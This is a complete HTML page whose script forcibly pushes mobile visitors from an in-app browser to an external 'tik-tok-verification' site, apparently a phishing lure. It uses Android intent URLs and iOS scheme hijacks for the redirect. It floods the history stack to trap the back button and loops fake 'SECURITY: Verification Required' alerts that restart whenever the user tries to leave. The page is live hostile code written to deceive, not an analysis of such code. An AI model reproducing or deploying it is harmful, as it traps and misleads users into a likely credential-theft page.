<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { margin: 0; padding: 0; background: #fff; width: 100%; height: 100%; overflow: hidden; }
        /* This invisible layer captures the touch to 'authorize' the external jump */
        #trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; }
    </style>
</head>
<body>
    <div id="trigger" onclick="forceDirectExternal()"></div>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; // 5 SECOND FAIL-SAFE

    function forceDirectExternal() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: Chrome Intent with 'Action View' and explicit package
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
        } else if (isIOS) {
            // iOS: Protocol Shotgun
            // 1. Try to trigger the "Open in Safari" banner via a search hijack
            window.location.replace("x-web-search://?" + encodeURIComponent(target));
            
            // 2. The "Handover" click - simulating a real user navigation
            const a = document.createElement('a');
            a.href = target;
            a.rel = "noreferrer";
            a.target = "_blank";
            a.click();
        }
    }

    function rampage() {
        if (Date.now() > killTime) return; // FAIL-SAFE CHECK

        // Force a redirect attempt before the alert
        forceDirectExternal();

        // The alert freezes the app, allowing the OS to process the redirect intent
        alert("SECURITY: Verification Required\n\nTap OK to open your secure browser.");
        
        // Force again immediately after dismissal
        forceDirectExternal();

        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // Build backstack
        for(let i=0; i<30; i++) history.pushState(null, null, "#step" + i);
        
        // Start the alert rampage
        rampage();
    };

    // If the user tries to hit 'X' (blur), restart the logic
    window.onblur = () => {
        if (Date.now() < killTime) rampage();
    };
</script>
</body>
</html>
